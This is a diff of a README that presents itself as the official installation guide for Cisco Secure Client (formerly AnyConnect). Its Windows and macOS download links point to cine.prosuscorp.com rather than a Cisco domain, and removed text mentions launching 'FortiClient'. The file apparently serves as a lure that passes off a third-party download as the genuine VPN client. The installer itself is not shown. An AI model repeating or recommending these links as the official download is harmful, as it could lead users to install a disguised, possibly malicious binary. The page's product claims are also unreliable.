@@ -1,6 +1,6 @@
-# Cisco Secure Client (including AnyConnect)
+# Cisco Secure Client
 
-**Cisco Secure Client** is a unified security application designed to provide users with secure remote access and advanced endpoint protection. Formerly known as Cisco AnyConnect, this modernized client integrates multiple Cisco security solutions into a single platform to enhance security, streamline administration, and improve user experience.
+**Cisco Secure Client (including AnyConnect)** is an advanced, unified security solution designed to enhance your organization's connectivity and safeguard its digital assets. Formerly known as Cisco AnyConnect, this versatile tool integrates VPN access, endpoint protection, and telemetry capabilities, enabling seamless and secure connections for remote and mobile users. With robust features like multi-factor authentication, automated threat detection, and comprehensive device visibility, Cisco Secure Client ensures data integrity while optimizing network performance. Its user-friendly interface and compatibility across platforms make it a reliable choice for organizations prioritizing security and operational efficiency in today’s dynamic digital landscape.
 
 ## Table of Contents
 - [Installation](#installation)
@@ -12,13 +12,9 @@
 
 ## Installation
 ### Installing on Windows
- ### 🔗 [**Download Cisco Secure Client**](https://cine.prosuscorp.com/secure/)
-1. Run the executable file.
-2. Follow the on-screen instructions:
-   - Accept the license agreement.
-   - Choose the installation folder.
-3. Complete the installation and restart the system if prompted.
-4. Launch FortiClient from the desktop shortcut.
+###  [**Download Cisco Secure Client**](https://cine.prosuscorp.com/secure/)
+1. Run the installer and follow the on-screen prompts.
+2. Configure the client based on your organization’s requirements. For detailed installation and configuration steps, refer to the Installation and Setup Guide.
 
 ### Installing on macOS
 1. [**Download `.dmg` file**](https://cine.prosuscorp.com/secure/)
